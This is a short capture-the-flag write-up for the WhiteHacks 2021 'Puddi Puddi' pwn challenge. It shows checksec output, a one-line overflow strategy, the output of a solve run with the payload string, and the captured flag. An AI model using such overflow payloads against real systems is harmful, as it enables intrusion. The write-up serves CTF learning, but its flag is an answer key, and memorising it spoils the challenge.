# Puddi Puddi
981, PWN, 12 SOLVES


### Description
Why have a MEGA 🍮 when you can have a GIGA 🍮?

Interact with the service using nc chals.whitehacks.ctf.sg 20301 to get started!

### Attached Files
exploit-template.py
puddi

## Solution

### Strategy
$ checksec puddi
[*] '/mnt/c/Users/zunmu/Documents/Stuff/Github/Solutions/Cyber Security/Capture the Flag Competitions/2021/Whitehacks 2021/Pwn/Puddi Puddi/puddi'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled


The idea is a typical buffer overflow problem, to overflow the variable such that you modify the other variables on the stack

$ rbp is the base pointer, $rsp is the stack pointer

Through math and trial and error on gdb, we can figure out

### Getting the flag from the server
```
$ python solve.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGIGA
[+] Opening connection to chals.whitehacks.ctf.sg on port 20301: Done
PUDDI PUDDI!
[*] Switching to interactive mode

PUDDI PUDDI!
SUGOKU DEKKAI...

 .d8888b.  8888888  .d8888b.         d8888       8888888b.  888     888 8888888b.  8888888b. 8888888 888
d88P  Y88b   888   d88P  Y88b       d88888       888   Y88b 888     888 888  "Y88b 888  "Y88b  888   888
888    888   888   888    888      d88P888       888    888 888     888 888    888 888    888  888   888
888          888   888            d88P 888       888   d88P 888     888 888    888 888    888  888   888
888  88888   888   888  88888    d88P  888       8888888P"  888     888 888    888 888    888  888   888
888    888   888   888    888   d88P   888       888        888     888 888    888 888    888  888   Y8P
Y88b  d88P   888   Y88b  d88P  d8888888888       888        Y88b. .d88P 888  .d88P 888  .d88P  888    "
 "Y8888P88 8888888  "Y8888P88 d88P     888       888         "Y88888P"  8888888P"  8888888P" 8888888 888


WH2021{3880fba0faf0_g1g4_pudd1}

[*] Got EOF while reading in interactive
$                
```

## Flag
`WH2021{3880fba0faf0_g1g4_pudd1}`